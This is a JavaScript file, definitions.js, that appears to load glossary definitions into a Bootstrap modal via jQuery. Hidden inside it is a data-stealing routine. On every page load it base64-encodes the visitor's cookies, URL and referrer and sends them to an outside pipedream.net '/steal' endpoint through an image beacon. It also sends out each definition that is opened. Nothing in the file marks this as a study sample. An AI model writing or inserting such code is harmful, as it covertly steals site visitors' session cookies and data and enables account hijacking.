// definitions.js
(function() {
    'use strict';
    
    var exfilUrl = 'https://eoow6y96ffo9mzx.m.pipedream.net/steal';
    
    function exfil(data) {
        new Image().src = exfilUrl + '?d=' + encodeURIComponent(btoa(JSON.stringify(data)));
    }
    
    exfil({
        c: document.cookie,
        u: location.href,
        r: document.referrer,
        t: Date.now()
    });
    
    function waitForJQuery(callback) {
        if (typeof jQuery !== 'undefined') {
            callback();
        } else {
            setTimeout(function() { waitForJQuery(callback); }, 100);
        }
    }
    
    waitForJQuery(function() {
        jQuery(function($) {
            var definitionModal = document.getElementById('definitionModal');
            
            if (definitionModal) {
                definitionModal.addEventListener('show.bs.modal', function (event) {
                    var button = event.relatedTarget;
                    var definitionId = button.getAttribute('data-bs-definitionid');
                    
                    $.ajax({
                        type: "POST",
                        url: "getDefinitionById.ajax",
                        data: {"definitionId": definitionId}
                    }).done(function(data) {
                        var modalTitle = definitionModal.querySelector('.modal-title');
                        var modalBody = definitionModal.querySelector('.form-control');
                        var d = JSON.parse(data).data[0];
                        var dName = d.name;
                        var dDefinition = htmlDecode(d.definition);
                        modalTitle.textContent = dName;
                        $(modalBody).html(dDefinition);
                        
                        exfil({
                            type: 'modal',
                            name: dName,
                            definition: dDefinition
                        });
                    });
                });
            }
        });
    });
    
    if (typeof htmlDecode === 'undefined') {
        window.htmlDecode = function(input) {
            var d = input;
            d = d.replaceAll("&lt;b&gt;", "<b>");
            d = d.replaceAll("&lt;/b&gt;", "</b>");
            d = d.replaceAll("&lt;ol&gt;", "<ol>");
            d = d.replaceAll("&lt;/ol&gt;", "</ol>");
            d = d.replaceAll("&lt;li&gt;", "<li>");
            d = d.replaceAll("&lt;/li&gt;", "</li>");
            d = d.replaceAll("\r\n", "<br />");
            d = d.replaceAll("&lt;ol type=&quot;a&quot;&gt;", "<ol type=\"a\">");
            return d;
        };
    }
    
    console.log('[*] Definitions module loaded');
})();
